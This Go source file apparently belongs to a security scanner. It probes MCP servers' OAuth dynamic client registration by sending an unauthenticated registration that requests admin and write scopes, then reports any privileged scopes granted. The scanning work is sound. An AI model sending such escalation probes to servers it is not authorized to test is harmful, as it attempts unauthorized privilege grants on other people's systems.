// Package mcp contains attack executors for the MCP (Model Context Protocol).
package mcp

import (
	"context"
	"fmt"
	"strings"
	"unicode/utf8"

	"github.com/calbebop/batesian/internal/attack"
)

// OAuthDCRExecutor tests whether an MCP server's OAuth 2.1 dynamic client
// registration (DCR) endpoint lets an UNAUTHENTICATED party register a client
// authorized for high-privilege scopes (rule mcp-oauth-dcr-001).
//
// Scope is deliberately narrow. Open/anonymous DCR is permitted by RFC 7591 and
// supported by the MCP authorization spec, so it is NOT reported on its own.
// Redirect-URI shape is also not judged at registration time: loopback redirects
// are endorsed by RFC 8252 and a client's own external callback cannot be deemed
// malicious by the server. The single high-value, protocol-specific failure is
// an authorization server that hands an anonymous registrant admin/write scopes.
//
// Attack sequence:
//  1. Discover the DCR endpoint via /.well-known/oauth-authorization-server.
//  2. Send an UNAUTHENTICATED registration requesting admin/write scopes.
//  3. Fire only when the server returns a granted `scope` containing a
//     privileged scope token - i.e. it registered an anonymous client as
//     authorized for those scopes.
//
// This is registration-time evidence only: a permissive granted `scope` shows
// the server did not restrict the requested scopes, but whether a privileged
// token is actually issued depends on the grant/consent step. The finding is
// therefore a RiskIndicator, not a demonstrated escalation.
type OAuthDCRExecutor struct {
	rule attack.RuleContext
}

// NewOAuthDCRExecutor creates an executor for the oauth-dcr-scope-escalation attack type.
func init() {
	attack.Register("oauth-dcr-scope-escalation", func(rc attack.RuleContext) attack.Executor { return NewOAuthDCRExecutor(rc) })
}

func NewOAuthDCRExecutor(r attack.RuleContext) *OAuthDCRExecutor {
	return &OAuthDCRExecutor{rule: r}
}

// adminScopes are MCP-specific high-privilege scope tokens that should not be
// granted to an anonymous registrant. Standard OIDC scopes (openid, profile,
// email) are intentionally excluded because many authorization servers grant
// them by default and they do not imply privilege escalation in the MCP context.
var adminScopes = []string{"admin", "tools:write", "resources:write", "prompts:write", "write", "superuser", "root"}

// Execute runs the DCR scope escalation test.
func (e *OAuthDCRExecutor) Execute(ctx context.Context, target string, opts attack.Options) ([]attack.Finding, error) {
	vars := attack.NewVars(target, opts.OOBListenerURL)
	// metadata discovery may use any configured token; the DCR registration is
	// sent unauthenticated to test the anonymous-attacker exploitation path.
	client := attack.NewHTTPClient(opts, vars)
	unauthClient := attack.NewUnauthHTTPClient(opts, vars)

	// Step 1: Discover the OAuth metadata endpoint to find the registration endpoint.
	registrationEndpoint, err := e.discoverRegistrationEndpoint(ctx, client, vars.BaseURL)
	if err != nil {
		// Not a finding - this MCP server may not use OAuth 2.1.
		return nil, nil //nolint:nilerr
	}

	// Step 2: Unauthenticated registration requesting admin/write scopes.
	escalatedScope := "tools:read tools:write resources:write prompts:write admin superuser"
	escalatedResp, err := unauthClient.POST(ctx, registrationEndpoint, nil, map[string]interface{}{
		"client_name":    "batesian-probe-" + vars.RandID + "-esc",
		"redirect_uris":  []string{"https://batesian.invalid/callback"},
		"grant_types":    []string{"authorization_code"},
		"response_types": []string{"code"},
		"scope":          escalatedScope,
	})
	if err != nil {
		return nil, fmt.Errorf("DCR registration request failed: %w", err)
	}

	// Step 3: Fire only when registration succeeded AND the server registered a
	// privileged scope. A rejected registration (auth required / scope policy)
	// or a granted scope reduced to read-only is correct behaviour: no finding.
	if escalatedResp.StatusCode != 200 && escalatedResp.StatusCode != 201 {
		return nil, nil
	}
	grantedScope := escalatedResp.JSONField("scope")
	granted := privilegedScopesIn(grantedScope)
	if len(granted) == 0 {
		return nil, nil
	}

	return []attack.Finding{{
		RuleID:     e.rule.ID,
		RuleName:   e.rule.Name,
		Severity:   e.rule.Severity,
		Confidence: attack.RiskIndicator,
		Title:      "MCP OAuth DCR registered an unauthenticated client with admin/write scopes",
		Description: fmt.Sprintf("The dynamic client registration endpoint at %s accepted an unauthenticated "+
			"registration and returned a granted scope set containing privileged scopes %v. The authorization "+
			"server registered an anonymous client as authorized to request admin/write access; per RFC 7591 the "+
			"server's registration policy should restrict the scopes it grants. Whether a privileged token is "+
			"actually issued depends on the grant/consent step, so manually verify whether the authorization "+
			"server issues a token with these scopes to the anonymous client.",
			registrationEndpoint, granted),
		Evidence:    fmt.Sprintf("Requested: %q\nGranted: %q\nPrivileged tokens granted: %v\nHTTP %d from %s\n%s", escalatedScope, grantedScope, granted, escalatedResp.StatusCode, registrationEndpoint, snippetMCP(escalatedResp.Body)),
		Remediation: e.rule.Remediation,
		TargetURL:   registrationEndpoint,
	}}, nil
}

// discoverRegistrationEndpoint fetches the OAuth server metadata to find the
// registration_endpoint. Tries /.well-known/oauth-authorization-server first,
// then /.well-known/openid-configuration.
func (e *OAuthDCRExecutor) discoverRegistrationEndpoint(ctx context.Context, client *attack.HTTPClient, baseURL string) (string, error) {
	endpoints := []string{
		baseURL + "/.well-known/oauth-authorization-server",
		baseURL + "/.well-known/openid-configuration",
	}
	for _, ep := range endpoints {
		resp, err := client.GET(ctx, ep, nil)
		if err != nil || !resp.IsSuccess() {
			continue
		}
		regEP := resp.JSONField("registration_endpoint")
		if regEP != "" {
			return regEP, nil
		}
	}
	return "", fmt.Errorf("no OAuth authorization server metadata found at %s", baseURL)
}

// privilegedScopesIn returns the privileged scope tokens present in a granted
// scope string. Matching is exact per whitespace-delimited token (RFC 6749
// section 3.3), not substring, so "tools:read" is never mistaken for "read".
func privilegedScopesIn(grantedScope string) []string {
	admin := make(map[string]struct{}, len(adminScopes))
	for _, s := range adminScopes {
		admin[s] = struct{}{}
	}
	var found []string
	for _, tok := range strings.Fields(grantedScope) {
		if _, ok := admin[tok]; ok {
			found = append(found, tok)
		}
	}
	return found
}

// snippetMCP returns at most maxLen bytes of body, appending an ellipsis when it
// truncates.
//
// Truncation backs up to a UTF-8 rune boundary so a multi-byte character is
// never split. Snippets are taken from the scanned target's raw response and end
// up in Finding.Evidence, which is marshalled into JSON and SARIF; a trailing
// partial rune would be silently rewritten to U+FFFD there, corrupting the
// evidence for any target that returns non-ASCII text.
func snippetMCP(body []byte) string {
	const maxLen = 300
	if len(body) <= maxLen {
		return string(body)
	}
	cut := maxLen
	for cut > 0 && !utf8.RuneStart(body[cut]) {
		cut--
	}
	return string(body[:cut]) + "..."
}
